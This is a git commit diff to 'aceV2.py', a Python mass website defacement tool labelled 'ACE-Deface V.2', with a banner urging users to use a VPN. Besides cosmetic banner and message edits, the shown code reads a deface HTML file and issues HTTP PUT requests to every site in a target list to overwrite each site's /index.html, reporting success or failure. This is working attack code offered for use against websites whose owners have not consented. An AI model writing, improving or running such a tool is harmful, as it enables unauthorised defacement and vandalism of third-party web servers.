fbb6965ac91c97f2ea8e10a02f9f891cea7b4563
Lovely <83523587+CPScript@users.noreply.github.com>
2023-10-20 14:44:44 -0400

    Update aceV2.py

--- version/aceV2.py
+++ version/aceV2.py
@@ -32,16 +32,16 @@ colors = [
 color1, color2, color3, color4, color5 = random.sample(colors, 5)
 banner = f"""
 
-             ＿＿
-　　　　 　 / ＞　　フ   
- 　　　　　| 　_　 _ l   Author : Disease (CPScript)
-　 　　 　／` ミ＿xノ    Date   : 8-18-2023
-　　 　 /　　　 　 |     Tools  : ACE-Deface V.2
-　　　 /　 ヽ　　 ﾉ      Note   : Please use VPN!
-　 　 │　　|　|　|
-　／￣|　　 |　|　|
-　| (￣ヽ＿ヽ)__)
-　 ＼二つ
+                 ___
+           /  >  フ   
+          /   _  _|    Author : Disease (CPScript)
+        /`   ミ_x/    Date   : 8-18-2023
+     _//        |     Tools  : ACE-Deface V.2
+    /  ヽ       ﾉ       Note   : Please use VPN!
+    │     | | |
+  ／￣\   | | |  
+  | (￣ヽ＿ヽ)_)
+   ＼二つ
 
 
 
@@ -59,7 +59,7 @@ def eagle(tetew):
    else:
       ipt = raw_input(tetew)   
    return str(ipt)
-def white(script, target_file="targets.txt"):
+def white(script, target_file="version/targets.txt"):
     op = open(script, "r").read()
     with open(target_file, "r") as target:
         target = target.readlines()
@@ -67,7 +67,7 @@ def white(script, target_file="targets.txt"):
         print(" ")
         print(green+bold+"[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
         print(" ")
-	
+
         t = threading.Thread(target=animate)
         t.daemon = True  
         t.start()                
@@ -78,9 +78,9 @@ def white(script, target_file="targets.txt"):
                     site = "http://" + site
                 req = s.put(site + "/index.html", data=op)
                 if req.status_code < 200 or req.status_code >= 250:
-                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
+                    print(red + "[" + bold + " FAILED!\033[0m     " + red + " ] %s/%s" % (site, script))
                 else:
-                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
+                    print(green + "[" + bold + " SUCCESS✓\033[0m" + green + " ] %s/%s" % (site, script))
             except requests.exceptions.RequestException:
                 continue
             except KeyboardInterrupt:
@@ -92,7 +92,7 @@ def main(__bn__):
       try:
          print(green+'[Please put the deface script/ .html file in this same folder and type it\'s name below]'+reset+blue)
          print(' ')
-         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script's name \033[33m[Defaut script: index.html]\033[0m \033[34m> ")
+         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script's name \033[33m[Type 'version/index.html' For the built in script!]\033[0m \033[34m> ")
          if not os.path.isfile(a):
             print(' ')
             print(red+bold+"	file '%s' not found in this folder !"%(a))
